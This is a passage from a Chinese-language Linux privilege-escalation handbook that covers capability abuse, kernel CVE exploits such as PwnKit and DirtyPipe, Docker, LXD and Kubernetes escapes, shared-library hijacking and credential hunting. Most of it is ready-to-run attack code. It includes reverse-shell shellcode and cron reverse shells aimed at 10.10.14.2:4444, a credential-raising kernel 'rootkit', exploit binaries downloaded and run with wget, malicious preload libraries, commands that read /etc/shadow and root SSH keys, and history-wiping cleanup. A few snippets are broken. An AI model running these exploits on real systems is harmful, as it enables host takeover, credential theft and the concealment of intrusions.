| `cap_sys_admin` | 系统管理操作 | mount/mknod/swapon/等 |
| `cap_sys_ptrace` | 追踪任意进程 | 注入进程/读取内存 |
| `cap_dac_read_search` | 绕过文件读权限 | 读取 /etc/shadow |
| `cap_dac_override` | 绕过文件写权限 | 写入任意文件 |
| `cap_net_raw` | 原始套接字 | 网络嗅探/ARP欺骗 |
| `cap_net_admin` | 网络管理 | 修改网络配置 |
| `cap_sys_module` | 加载内核模块 | 加载 rootkit 模块 |
| `cap_setuid` | 设置 UID | 类似 SUID 效果 |
| `cap_setgid` | 设置 GID | 类似 SGID 效果 |
| `cap_chown` | 修改文件属主 | 将任意文件 chown 给 root |
| `cap_fowner` | 绕过文件属主检查 | 修改任意文件权限 |
| `cap_sys_rawio` | 原始 I/O 访问 | 读写磁盘设备 |
| `cap_sys_boot` | 系统重启 | 重启系统 |
| `cap_sys_time` | 修改系统时间 | 时间戳攻击 |
| `cap_sys_nice` | 修改进程优先级 | 资源抢占 |
| `cap_net_bind_service` | 绑定特权端口 (<1024) | 监听 80/443 |
| `cap_sys_resource` | 资源限制提升 | 绕过 ulimit |

### 5.2 cap_sys_admin — 最危险的能力

```bash
# cap_sys_admin 允许执行 mount 操作
# 利用方式：挂载 cgroup 实现容器逃逸级提权

# 1. 检查 Python 二进制是否有 cap_sys_admin
getcap -r / 2>/dev/null | grep cap_sys_admin
# 输出：/usr/bin/python3.8 = cap_sys_admin+ep

# 2. 利用 cap_sys_admin 挂载 cgroup
# 创建 release_agent 逃逸
mkdir -p /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/bash' > /cmd
echo 'chmod u+s /bin/bash' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# 3. 获得 SUID bash
/bin/bash -p
```

### 5.3 cap_sys_ptrace — 进程注入提权

```bash
# cap_sys_ptrace 允许 ptrace 任意进程，包括 root 进程
# 利用方式：注入 shellcode 到 root 进程

# 1. 检查 Python 是否有 cap_sys_ptrace
getcap -r / 2>/dev/null | grep cap_sys_ptrace

# 2. 注入 shellcode 到 root 进程（使用 Python）
cat > /tmp/ptrace_shell.py << 'EOF'
import ctypes
import sys
import os

# Shellcode: 反弹 shell 到 10.10.14.2:4444
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f py
shellcode = b""
shellcode += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
shellcode += b"\x48\x97\x48\xb9\x02\x00\x11\x5c\x0a\x0a\x0e\x02"
shellcode += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
shellcode += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
shellcode += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
shellcode += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
shellcode += b"\x0f\x05"

libc = ctypes.CDLL("libc.so.6")
PTRACE_ATTACH = 16
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_POKETEXT = 4
PTRACE_CONT = 7
PTRACE_DETACH = 17

target_pid = int(sys.argv[1])
libc.ptrace(PTRACE_ATTACH, target_pid, 0, 0)
# ... (完整注入代码)
EOF
python3 /tmp/ptrace_shell.py <root_process_pid>
```

### 5.4 cap_dac_read_search — 读取任意文件

```bash
# cap_dac_read_search 绕过文件读权限检查
# 利用方式：读取 /etc/shadow 等敏感文件

# 1. 检查 tar 或其他二进制是否有此 Capability
getcap -r / 2>/dev/null | grep cap_dac_read_search

# 2. 利用 tar 读取 /etc/shadow
tar -cf - /etc/shadow 2>/dev/null | tar -xOf - 2>/dev/null

# 3. 利用 Python 读取
python3 -c "
import os
os.setuid(0)  # 需要 cap_setuid
print(open('/etc/shadow').read())
"

# 4. 读取 root SSH 私钥
tar -cf - /root/.ssh/id_rsa 2>/dev/null | tar -xOf - 2>/dev/null
```

### 5.5 cap_setuid + cap_setgid — 直接提权

```bash
# cap_setuid 允许调用 setuid()，直接设为 root (uid=0)
# 利用方式：执行任意代码调用 setuid(0)

# 1. Python 利用
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 2. Perl 利用
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# 3. C 代码利用
cat > /tmp/setuid.c << 'EOF'
#include <unistd.h>
#include <stdlib.h>
int main() {
    setuid(0); setgid(0);
    system("/bin/bash");
    return 0;
}
EOF
gcc -o /tmp/setuid /tmp/setuid.c
# 如果二进制本身有 cap_setuid+ep，执行即可
./tmp/setuid
```

### 5.6 cap_net_raw — 网络嗅探与 ARP 欺骗

```bash
# cap_net_raw 允许创建原始套接字
# 利用方式：流量嗅探、ARP 欺骗

# 1. tcpdump 嗅探（如果 tcpdump 有 cap_net_raw）
tcpdump -i eth0 -w /tmp/capture.pcap
# 提取凭据（HTTP 明文、FTP、Telnet 等）

# 2. Python scapy 嗅探
python3 -c "
from scapy.all import sniff
def packet_callback(pkt):
    if pkt.haslayer('Raw'):
        print(pkt[Raw].load)
sniff(iface='eth0', prn=packet_callback, count=100)
"

# 3. ARP 欺骗（中间人攻击）
# 需要 cap_net_raw + cap_net_admin
python3 -c "
from scapy.all import ARP, Ether, sendp
# ARP 欺骗：声称自己是网关
# ...
"
```

### 5.7 cap_sys_module — 加载内核模块

```bash
# cap_sys_module 允许加载/卸载内核模块
# 利用方式：加载恶意内核模块（rootkit）

# 1. 编写简单内核模块
cat > /tmp/rootkit.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/cred.h>
#include <linux/sched.h>

static int __init rootkit_init(void) {
    struct cred *new_cred = prepare_creds();
    new_cred->uid.val = new_cred->gid.val = 0;
    new_cred->euid.val = new_cred->egid.val = 0;
    new_cred->suid.val = new_cred->sgid.val = 0;
    new_cred->fsuid.val = new_cred->fsgid.val = 0;
    commit_creds(new_cred);
    printk(KERN_INFO "[+] Got root!\n");
    return 0;
}
static void __exit rootkit_exit(void) { }

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
EOF

# 2. 编译并加载
# 需要内核头文件
make -C /lib/modules/$(uname -r)/build M=/tmp modules
insmod /tmp/rootkit.ko
```

---

## 6. 内核漏洞利用 — 从 CVE 到 root

内核漏洞利用是 Linux 提权的终极手段。本节覆盖历史经典 CVE 与 2026 年最新内核漏洞的完整利用链。

### 6.1 内核漏洞利用前置检查

```bash
# === 内核版本精确获取 ===
uname -r
cat /proc/version
# 格式：Linux version 5.4.0-150-generic (buildd@xxx) (gcc version 9.4.0)

# === 发行版 => 可能的内核版本补丁状态 ===
cat /etc/os-release
# Ubuntu 22.04 LTS → 内核 5.15.x
# Ubuntu 20.04 LTS → 内核 5.4.x
# CentOS 7 → 内核 3.10.x
# Debian 11 → 内核 5.10.x

# === 内核编译选项（影响利用可行性）===
cat /boot/config-$(uname -r) 2>/dev/null | grep -E "CONFIG_KALLSYMS|CONFIG_STRICT_DEVMEM|CONFIG_DEVMEM"
cat /proc/kallsyms | head -5               # 内核符号表
cat /proc/sys/kernel/kptr_restrict         # 0=可读内核地址
cat /proc/sys/kernel/dmesg_restrict        # 0=可读 dmesg
cat /proc/sys/kernel/unprivileged_bpf_disabled  # 0=可加载 eBPF

# === 用户命名空间 ===
unshare -U whoami 2>/dev/null              # 测试是否可用
cat /proc/sys/user/max_user_namespaces     # 最大用户命名空间数
```

### 6.2 CVE-2021-4034 (PwnKit) — Polkit pkexec

```bash
# 影响：2009 年至 2022 年所有 polkit 版本
# 利用：pkexec 参数注入导致越界写
# 成功率：极高（几乎所有 Linux 发行版默认安装）

# 检查版本
pkexec --version
# polkit 版本 <= 0.120 受影响

# Python PoC（一键利用）
cat > /tmp/pwnkit.py << 'EOF'
#!/usr/bin/env python3
import os
import sys

def exploit():
    os.mkdir("GCONV_PATH=.", 0o777)
    os.mkdir("pwnkit", 0o777)
    with open("GCONV_PATH=./pwnkit", "w") as f:
        f.write("")
    os.chmod("GCONV_PATH=./pwnkit", 0o777)
    with open("pwnkit/gconv-modules", "w") as f:
        f.write("module UTF-8// PWNKIT// pwnkit 2\n")
    with open("pwnkit/pwnkit.c", "w") as f:
        f.write('''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
    setuid(0); setgid(0);
    setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
    execl("/bin/sh", "sh", NULL);
    exit(0);
}''')
    os.system("gcc -shared -fPIC -o pwnkit/pwnkit.so pwnkit/pwnkit.c")
    env = os.environ.copy()
    env["PATH"] = "GCONV_PATH=."
    env["CHARSET"] = "PWNKIT"
    env["SHELL"] = "pwnkit"
    os.execve("/usr/bin/pkexec", ["pkexec"], env)

if __name__ == "__main__":
    exploit()
EOF
python3 /tmp/pwnkit.py

# 或使用预编译版本
wget https://github.com/ly4k/PwnKit/raw/main/PwnKit -O /tmp/PwnKit
chmod +x /tmp/PwnKit && /tmp/PwnKit
```

### 6.3 CVE-2022-0847 (DirtyPipe) — 管道覆写任意文件

```bash
# 影响：Linux 内核 5.8 - 5.16.11, 5.15.25, 5.10.102
# 利用：通过管道缓冲区覆写任意只读文件
# 典型场景：覆写 /etc/passwd 添加 root 用户

# 检查内核版本
uname -r | grep -E "^5\.(8|9|1[0-9]|1[0-6])"

# 一键 PoC（覆写 /etc/passwd）
cat > /tmp/dirtypipe.c << 'EOF'
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <stdint.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

void dirty_pipe(char *path, off_t offset, char *data, size_t len) {
    int fd = open(path, O_RDONLY);
    struct stat st;
    fstat(fd, &st);
    int pipefd[2];
    pipe(pipefd);
    off_t target = offset % PAGE_SIZE;
    int bufsize = st.st_size - offset;
    if (bufsize > PAGE_SIZE) bufsize = PAGE_SIZE;
    splice(fd, &offset, pipefd[1], NULL, 1, SPLICE_F_MOVE);
    write(pipefd[1], data, len);
    close(fd);
    close(pipefd[0]);
    close(pipefd[1]);
}

int main() {
    // 覆写 /etc/passwd 中的 root 行
    // 将 "root:x:0:0:root:/root:/bin/bash" 改为 "root::0:0:root:/root:/bin/bash"
    dirty_pipe("/etc/passwd", 4, ":", 1);
    printf("[+] Done. Now 'su root' without password.\n");
    return 0;
}
EOF
gcc -o /tmp/dirtypipe /tmp/dirtypipe.c
/tmp/dirtypipe
# 然后 su root (无需密码)

# 覆写 SUID 二进制
# 备份 /bin/bash 然后覆写为 SUID 版本
cp /bin/bash /tmp/bash
dirty_pipe("/tmp/bash", 0x..., ...)  # 修改 ELF 头中的权限位
/tmp/bash -p
```

### 6.4 CVE-2023-0386 (OverlayFS) — 用户命名空间提权

```bash
# 影响：Linux 内核 5.11 - 6.1
# 利用：OverlayFS 文件系统 CVE-2023-0386
# 前置条件：用户命名空间已启用

# 检查
unshare -U whoami 2>/dev/null && echo "[+] User namespace available"
uname -r | grep -E "^5\.(1[1-9]|1[5-9])|^6\.[0-1]"

# 利用 PoC
git clone https://github.com/xkaneiki/CVE-2023-0386.git
cd CVE-2023-0386
make
./fuse ./ovlcap/lower ./ovlcap/upper ./ovlcap/work ./ovlcap/merged
# 在新终端
./exp
```

### 6.5 CVE-2023-4911 (Looney Tunables) — glibc ld.so 提权

```bash
# 影响：glibc 2.34+
# 利用：GLIBC_TUNABLES 环境变量导致缓冲区溢出
# 多数 Linux 发行版受影响

# 检查 glibc 版本
ldd --version

# 利用
wget https://github.com/leesh3288/CVE-2023-4911/raw/main/exp
chmod +x exp && ./exp
```

### 6.6 CVE-2023-3269 (StackRot) — 内核栈扩展竞争

```bash
# 影响：Linux 内核 6.1 - 6.4
# 利用：内核栈扩展竞争导致 UAF

# 检查
uname -r | grep -E "^6\.[1-4]"

# 利用需本地编译，参考：
# https://github.com/lrh2000/StackRot
```

### 6.7 CVE-2024-21626 (runc) — 容器逃逸

```bash
# 影响：runc 1.0.0-rc93 - 1.1.11
# 利用：WORKDIR 指令处理导致文件描述符泄露

# 在容器内
cat > /tmp/escape.c << 'EOF'
// 详见容器逃逸章节
EOF
```

### 6.8 GameOver(lay) — CVE-2023-2640 & CVE-2023-32629

```bash
# 影响：Ubuntu 特定内核（OverlayFS + 用户命名空间）
# CVE-2023-2640: Ubuntu 内核的 OverlayFS 未正确检查权限
# CVE-2023-32629: 与前者类似

# 检查
cat /etc/os-release | grep Ubuntu
uname -r

# 利用（GameOver(lay) 一键脚本）
wget https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/raw/main/exploit.sh
chmod +x exploit.sh && ./exploit.sh
```

### 6.9 2026 年内核 CVE 更新

```bash
# === CVE-2025-XXXXX (2025-2026 新内核 CVE) ===
# 持续更新最新的内核提权 CVE

# 2025-2026 关注点：
# - io_uring 子系统：持续的高危漏洞来源
# - eBPF verifier 绕过：JIT 喷射技术演进
# - KSMBD (内核 SMB 服务器)：新攻击面
# - NVMe-oF / RDMA 子系统：企业级内核攻击面
# - Btrfs/XFS 文件系统漏洞
# - KVM 虚拟机逃逸

# 内核漏洞利用开发框架
# linux-exploit-suggester-2
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
perl linux-exploit-suggester-2.pl

# 自动化内核 CVE 检测
curl -s https://api.msrc.microsoft.com/cvrf/v2.0/updates | jq .
```

### 6.10 内核提权稳定化技巧

```bash
# 内核漏洞利用可能导致系统崩溃，注意以下几点：
# 1. 测试环境先验证
# 2. 记录内核版本、发行版、内核配置
# 3. 优先使用成熟的公开 PoC
# 4. 避免使用未经验证的 0day（不稳定）
# 5. 做好快照/备份

# 内核漏洞利用后的清理
# 删除利用痕迹
rm -rf /tmp/exploit* /tmp/pwnkit* /tmp/dirty*
# 清除历史记录
history -c
cat /dev/null > ~/.bash_history
```

---

## 7. 容器逃逸 — Docker/LXC 容器突破

容器逃逸是云原生环境中最关键的提权场景。当攻击者获得容器内低权限 shell 后，需要突破容器隔离获取宿主机 root 权限。

### 7.1 Docker Socket 挂载 — 最经典的逃逸

```bash
# === 检测 Docker Socket ===
ls -la /var/run/docker.sock
# 如果存在且可读写，几乎可以 100% 逃逸

# 检测是否在容器内
cat /proc/1/cgroup | grep -E "docker|lxc|kubepods"
# 或检查 /.dockerenv 文件是否存在
ls -la /.dockerenv

# === 利用 Docker Socket 逃逸 ===
# 方法 1：docker run 挂载宿主机根目录
docker run -it -v /:/host alpine chroot /host /bin/bash
# 或直接执行命令
docker run -it -v /:/host alpine /bin/sh -c "chroot /host chmod u+s /bin/bash"

# 方法 2：docker exec 进入宿主机
# 先创建新容器，挂载宿主机文件系统
docker run -d --name escape -v /:/host alpine sleep 3600
docker exec -it escape chroot /host /bin/bash

# 方法 3：写入 crontab
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"' \
  | docker run -i -v /:/host alpine tee /host/etc/crontab

# 方法 4：写入 SSH 公钥
mkdir -p /tmp/.ssh
ssh-keygen -t rsa -f /tmp/.ssh/id_rsa -N ""
docker run -i -v /:/host alpine mkdir -p /host/root/.ssh
docker run -i -v /:/host alpine tee -a /host/root/.ssh/authorized_keys < /tmp/.ssh/id_rsa.pub
ssh -i /tmp/.ssh/id_rsa root@<host_ip>

# 方法 5：直接使用 docker 客户端
# 如果容器内安装了 docker 客户端
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host /bin/bash
```

### 7.2 Privileged 容器逃逸

```bash
# === 检测是否为 privileged 容器 ===
cat /proc/1/status | grep -i "CapEff:" | awk '{print $2}'
# privileged 容器拥有几乎所有 Capabilities

# 检查是否有设备访问权限
ls -la /dev/
# privileged 容器可以访问 /dev/sda, /dev/mem 等设备

# === 方法 1：挂载宿主机磁盘 ===
fdisk -l                                    # 查看宿主机磁盘
mkdir -p /tmp/host
mount /dev/sda1 /tmp/host                   # 挂载宿主机分区
chroot /tmp/host /bin/bash                  # 进入宿主机

# === 方法 2：利用 cgroup release_agent ===
mkdir -p /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'chmod u+s /bin/bash' >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# 等待 cgroup 释放后，宿主机上的 /bin/bash 变为 SUID

# === 方法 3：利用 /dev 设备 ===
# 如果有 cap_sys_rawio，直接读写宿主机磁盘
# 获取宿主机 SSH 密钥
dd if=/dev/sda1 bs=512 count=1 2>/dev/null | strings

# === 方法 4：内核模块加载 ===
# 如果有 cap_sys_module
cat > /tmp/escape.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cred.h>
#include <linux/nsproxy.h>
#include <linux/pid_namespace.h>
static int __init escape_init(void) {
    struct cred *new = prepare_creds();
    new->uid.val = new->gid.val = 0;
    new->euid.val = new->egid.val = 0;
    commit_creds(new);
    // 切换到宿主机命名空间
    switch_task_namespaces(current, &init_nsproxy);
    return 0;
}
module_init(escape_init);
MODULE_LICENSE("GPL");
EOF
# 编译并 insmod（需要宿主机内核头文件）
```

### 7.3 CVE-2024-21626 (runc 逃逸)

```bash
# 影响：runc 1.0.0-rc93 - 1.1.11
# 利用条件：容器内可执行恶意二进制或 Dockerfile 控制

# 在容器内利用
cat > /tmp/runc_escape.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

int main() {
    // 利用 runc WORKDIR 处理缺陷
    // 打开宿主机文件描述符
    int fd = open("/proc/self/fd/7", O_RDONLY);
    if (fd < 0) {
        fd = open("/proc/self/fd/8", O_RDONLY);
    }
    if (fd >= 0) {
        // 通过泄露的 fd 访问宿主机文件系统
        // 写入 /etc/crontab 添加反弹 shell
        char *payload = "* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'\n";
        write(fd, payload, strlen(payload));
        close(fd);
    }
    return 0;
}
EOF
gcc -o /tmp/runc_escape /tmp/runc_escape.c
/tmp/runc_escape
```

### 7.4 cap_sys_admin 容器逃逸

```bash
# 在容器中，如果拥有 cap_sys_admin
# 方法 1：mount 宿主机文件系统
fdisk -l 2>/dev/null
mount /dev/sda1 /mnt
chroot /mnt /bin/bash

# 方法 2：notify_on_release cgroup 逃逸（需要 release_agent 可写）
# 步骤同 privileged 容器中的方法 2

# 方法 3：利用 core_pattern 管道
# 如果 /proc/sys/kernel/core_pattern 可写
echo '|/tmp/escape.sh' > /proc/sys/kernel/core_pattern
# 然后触发一个 core dump 的进程
```

### 7.5 LXC / LXD 容器逃逸

```bash
# === 检测 LXC 环境 ===
cat /proc/1/cgroup | grep lxc
cat /proc/1/environ | tr '\0' '\n' | grep -i lxc

# === LXD 组逃逸 ===
# 如果用户在 lxd 组中
groups | grep lxd

# 方法：创建特权容器并挂载宿主机
# 1. 下载 Alpine 镜像
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder && ./build-alpine

# 2. 导入镜像
lxc image import alpine-v3.19-x86_64.tar.gz --alias alpine

# 3. 创建特权容器
lxc init alpine privesc -c security.privileged=true

# 4. 挂载宿主机根目录
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

# 5. 启动并进入容器
lxc start privesc
lxc exec privesc /bin/sh

# 6. 在容器内访问宿主机
cd /mnt/root && chroot . /bin/bash
```

### 7.6 Kubernetes Pod 逃逸

```bash
# === 检测 K8s 环境 ===
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
env | grep KUBERNETES

# === K8s ServiceAccount 提权 ===
# 1. 获取 ServiceAccount Token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}' 2>/dev/null)
# 或从环境变量获取
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

# 2. 枚举权限
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/default/pods" | jq .

# 3. 如果 ServiceAccount 有 pod/create 权限，创建恶意 Pod
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST "$APISERVER/api/v1/namespaces/default/pods" \
  -d '{
    "apiVersion":"v1",
    "kind":"Pod",
    "metadata":{"name":"escape"},
    "spec":{
      "containers":[{
        "name":"escape",
        "image":"alpine",
        "command":["/bin/sh","-c","sleep 3600"],
        "volumeMounts":[{"name":"host","mountPath":"/host"}]
      }],
      "volumes":[{"name":"host","hostPath":{"path":"/"}}]
    }
  }'
```

### 7.7 容器逃逸检测与防御

```bash
# 检测容器逃逸
# 1. 检查异常进程
ps auxf | grep -E "docker|containerd|runc"
# 2. 检查异常挂载点
mount | grep -E "overlay|docker|containerd"
# 3. 检查 Docker Socket 访问日志
journalctl -u docker | grep "POST /containers"
# 4. 检查 cgroup 异常
cat /proc/cgroups
```

---

## 8. 共享库劫持 — LD_PRELOAD / RPATH / ld.so 攻击链

共享库劫持是 Linux 提权中隐蔽而高效的攻击向量。当 SUID 二进制或 root 运行的程序加载了可被攻击者控制的共享库时，即可实现代码执行。

### 8.1 LD_PRELOAD 劫持

```bash
# LD_PRELOAD 是最直接的共享库劫持方式
# 但现代系统对 SUID 二进制和 sudo 会清理 LD_PRELOAD
# 利用场景：sudo SETENV 配置、非 SUID 的 root 进程

# 1. 编写恶意共享库
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

// 构造函数：在库加载时自动执行
__attribute__((constructor)) void init() {
    // 清理 LD_PRELOAD 防止递归
    unsetenv("LD_PRELOAD");
    if (getuid() != 0) {
        setuid(0); setgid(0);
    }
    system("cp /bin/bash /tmp/bash && chmod u+s /tmp/bash");
}
EOF
gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c

# 2. 通过 sudo (SETENV) 注入
sudo LD_PRELOAD=/tmp/evil.so <allowed_command>

# 3. 通过环境变量注入（如果 SUID 二进制未清理）
LD_PRELOAD=/tmp/evil.so /usr/local/bin/suid_binary
```

### 8.2 LD_LIBRARY_PATH 劫持

```bash
# LD_LIBRARY_PATH 指定了动态链接器的搜索路径
# 对 SUID 二进制通常无效（glibc 会忽略），但非 SUID 的 root 进程有效

# 1. 识别目标程序使用的共享库
ldd /usr/local/bin/target_program
# 输出示例：
#   libcustom.so => not found
#   libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6

# 2. 如果发现 "not found" 的库，创建恶意版本
cat > /tmp/libcustom.so.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /tmp/libcustom.so /tmp/libcustom.so.c

# 3. 通过 LD_LIBRARY_PATH 加载
LD_LIBRARY_PATH=/tmp /usr/local/bin/target_program

# 4. 如果程序使用标准库，劫持一个不常用的库
# 例如：libcrypt, libpam, libssl 等
cat > /tmp/libcrypt.so.1.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
EOF
gcc -shared -fPIC -o /tmp/libcrypt.so.1 /tmp/libcrypt.so.1.c
LD_LIBRARY_PATH=/tmp /usr/local/bin/target_program
```

### 8.3 RPATH / RUNPATH 劫持

```bash
# RPATH 和 RUNPATH 是 ELF 文件中硬编码的库搜索路径
# 当 RPATH 包含可写目录时，可被劫持

# 1. 检查二进制文件的 RPATH/RUNPATH
readelf -d /usr/local/bin/target_program | grep -E "RPATH|RUNPATH"
# 或
objdump -x /usr/local/bin/target_program | grep -E "RPATH|RUNPATH"

# 2. 如果 RPATH 指向可写目录（如 /tmp, /home/user/lib）
# 检查 RPATH 目录是否可写
ls -la /opt/app/lib/

# 3. 如果可写，替换其中某个库
# 先确定目标程序加载了 RPATH 中的哪个库
strace -e openat /usr/local/bin/target_program 2>&1 | grep "/opt/app/lib"

# 4. 创建恶意库
cat > /opt/app/lib/libutils.so.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /opt/app/lib/libutils.so /opt/app/lib/libutils.so.c
```

### 8.4 ld.so.conf / ld.so.cache 劫持

```bash
# /etc/ld.so.conf 和 /etc/ld.so.conf.d/* 定义系统共享库搜索路径
# 如果攻击者可写入这些文件，可添加恶意库路径

# 1. 检查 ld.so.conf 及 include 目录是否可写
ls -la /etc/ld.so.conf
find /etc/ld.so.conf.d -writable -type f 2>/dev/null

# 2. 写入恶意路径
echo "/tmp/evil_libs" >> /etc/ld.so.conf.d/99-evil.conf
mkdir -p /tmp/evil_libs

# 3. 创建恶意库（劫持常见的库）
# 例如：劫持 libpam.so（PAM 模块，很多 SUID 程序使用）
cat > /tmp/evil_libs/libpam.so.0.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init() {
    FILE *fp = fopen("/tmp/pwned", "w");
    fprintf(fp, "PWNED by ld.so hijack\n");
    fclose(fp);
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /tmp/evil_libs/libpam.so.0 /tmp/evil_libs/libpam.so.0.c

# 4. 更新 ld.so.cache
ldconfig

# 5. 触发执行（任何使用 PAM 的 SUID 程序，如 su, sudo 等）
# 注意：这可能导致系统不稳定
```

### 8.5 共享库劫持检测脚本

```bash
cat > /tmp/lib_hijack_check.sh << 'EOF'
#!/bin/bash
echo "=== Scanning for library hijacking opportunities ==="

# 1. 扫描所有 SUID 二进制，检查 ldd 输出
echo -e "\n[1] SUID binaries with missing libraries:"
find / -perm -4000 -type f 2>/dev/null | while read bin; do
  ldd "$bin" 2>/dev/null | grep "not found" && echo "  -> $bin"
done

# 2. 扫描 RPATH/RUNPATH
echo -e "\n[2] Binaries with writable RPATH/RUNPATH:"
find / -perm -4000 -type f 2>/dev/null | while read bin; do
  rpath=$(readelf -d "$bin" 2>/dev/null | grep -E "RPATH|RUNPATH" | awk -F'[][]' '{print $2}')
  if [ -n "$rpath" ] && [ -w "$rpath" ]; then
    echo "  [!] $bin -> $rpath (WRITABLE)"
  fi
done

# 3. 检查 ld.so.conf 可写性
echo -e "\n[3] ld.so configuration writability:"
[ -w /etc/ld.so.conf ] && echo "  [!] /etc/ld.so.conf is WRITABLE"
find /etc/ld.so.conf.d -writable -type f 2>/dev/null | while read f; do
  echo "  [!] $f is WRITABLE"
done

# 4. 检查 LD_LIBRARY_PATH 利用场景
echo -e "\n[4] LD_LIBRARY_PATH check:"
echo "  Current LD_LIBRARY_PATH: ${LD_LIBRARY_PATH:-<not set>}"
sudo -l 2>/dev/null | grep -E "LD_LIBRARY_PATH|SETENV|env_keep" && echo "  [!] sudo allows env manipulation"
EOF
chmod +x /tmp/lib_hijack_check.sh
/tmp/lib_hijack_check.sh
```

---

## 9. 敏感文件与凭据 — 配置文件/历史/密钥挖掘

敏感文件与凭据挖掘是 Linux 提权中最容易被忽视但收益极高的手段。SSH 密钥、配置文件中的数据库密码、历史文件中的命令，往往直接通向 root。

### 9.1 历史文件挖掘

```bash
# === Bash 历史 ===
cat ~/.bash_history
cat /root/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
find /home -name ".bash_history" -exec cat {} \; 2>/dev/null

# === Zsh 历史 ===
cat ~/.zsh_history
cat /root/.zsh_history 2>/dev/null
find /home -name ".zsh_history" -exec cat {} \; 2>/dev/null

# === MySQL 历史 ===
cat ~/.mysql_history 2>/dev/null
cat /root/.mysql_history 2>/dev/null

# === 其他历史文件 ===
cat ~/.python_history 2>/dev/null
cat ~/.psql_history 2>/dev/null
cat ~/.redis_history 2>/dev/null
cat ~/.viminfo 2>/dev/null
cat ~/.lesshst 2>/dev/null

# === 历史文件中的密码模式 ===
grep -rni "password\|passwd\|pwd\|secret\|token\|api_key\|credential" \
  ~/.bash_history ~/.zsh_history 2>/dev/null
grep -rni "ssh\|mysql\|psql\|curl.*-u\|wget.*--user\|su .* -c" \
  ~/.bash_history 2>/dev/null
```

### 9.2 配置文件凭据挖掘

```bash
# === 数据库配置文件 ===
find / -name "wp-config.php" 2>/dev/null | xargs cat 2>/dev/null
find / -name "config.php" 2>/dev/null | xargs grep -i "password\|user\|host" 2>/dev/null
find / -name "*.env" 2>/dev/null | xargs cat 2>/dev/null
find / -name "database.yml" 2>/dev/null | xargs cat 2>/dev/null
find / -name "settings.py" 2>/dev/null | xargs grep -i "PASSWORD\|SECRET" 2>/dev/null
